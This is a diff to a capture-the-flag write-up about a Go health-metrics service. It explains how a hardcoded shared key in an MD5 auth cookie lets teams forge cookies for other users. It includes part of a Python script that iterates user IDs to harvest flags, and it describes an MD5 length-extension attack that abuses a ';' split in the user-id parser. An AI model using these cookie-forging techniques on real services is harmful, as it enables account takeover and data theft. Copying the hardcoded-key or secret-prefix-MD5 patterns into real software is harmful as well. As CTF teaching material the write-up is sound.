@@ -5,7 +5,7 @@ Written in go(golang), with access to source code.
 After logging in, we could add health metrics (weight, blood pressure, pulse, walking distance and a comment) and list these.
 Comments were only visible to the respective users when logged in.
 The database showed several users having flags as comments.
-Our goal was to read comments from other users from within one active.
+Our goal was to read comments from other users, without knowledge of their password.
 While registered and logged in we got some cookies: session, auth (which was obviously a md5 hash) and an id (which was a base64 decoded string "u_XXX", the user_id)
 
 ## fixed key
@@ -13,7 +13,7 @@ While registered and logged in we got some cookies: session, auth (which was obv
 Our go-to (obvious pun intended) was to look at main.go which showed a constant key. And since every team had the same vbox image, every team had to have the same key. This constant key was used for the auth cookie generation:
 
 e.g. the auth-verifier
-~~~
+``` go
 func authVerified(auth string, uId string) (bool, error) {
 	id := decodeBase64(uId)	//decode uID from cookie -> u_XXX
     res := md5hash(Key, id) //calculate md5hash of the key and the uID
@@ -23,7 +23,7 @@ func authVerified(auth string, uId string) (bool, error) {
 		return false, errors.New(Unauthorized)
 	}
 }
-~~~
+```
 
 We could see that you only had to know the uID and the key to calculate the auth-cookie. Since every key on every image was the same, we could easily exploit it.
 Course of action, accordingly, was:
@@ -35,7 +35,7 @@ The best solution was to decrease the uID and submit flags until no valid flags 
 
 Quick & Dirty exploit
 (python)
-~~~
+``` python
 import requests, re, base64, hashlib, random, string, sys
 
 key = "f11ecd5521ddf2614e17e4fb074a86da"
@@ -59,7 +59,7 @@ while(uid > uidorig - 100): #here you could improve the exploit
 	#get metrics
 	r = requests.get(url + "/healthmetrics", cookies=cookies)
 	print r.text #our submitter greps the flags
-~~~
+```
 
 To fix the flaw we just changed the key and recompiled it. (# go build)
 
@@ -74,25 +74,25 @@ If you are lazy and don't want to read up here is the short version: Merkel-Damg
 To make this work there still had to be some features in the code. To exploit the flaw you'd need to change the base64 encoded user id and the auth token. You could only append data to the user id, not change it, but these features were provided. 
 The check for the auth cookie is done in getUserId:
 
-~~~
+``` go
 auth := authCookie.Value
 id := idCookie.Value
 verified, err := authVerified(auth, id)
-~~~
+```
 and after that verification the id is extracted from the id cookie with the extractUid function. 
-~~~
+``` go
 func extractUid(idStr string) string {
 	id := decodeBase64(idStr)
 	f := strings.FieldsFunc(id, split)
 	return f[len(f)-1]
 }
-~~~
+```
 interesting so what does split split?
-~~~
+``` go
 func split(c rune) bool {
 	return c == ';' || c == ' ' 
 }
-~~~
+```
 so we can just append the new user id after a ; and can trigger a valid authentication for that user. 
 
 The only remaining problem is we do not know the length of the secret which we need to calculate our new auth token, but hash extender can generate multiple tokens at once with varying secret length.
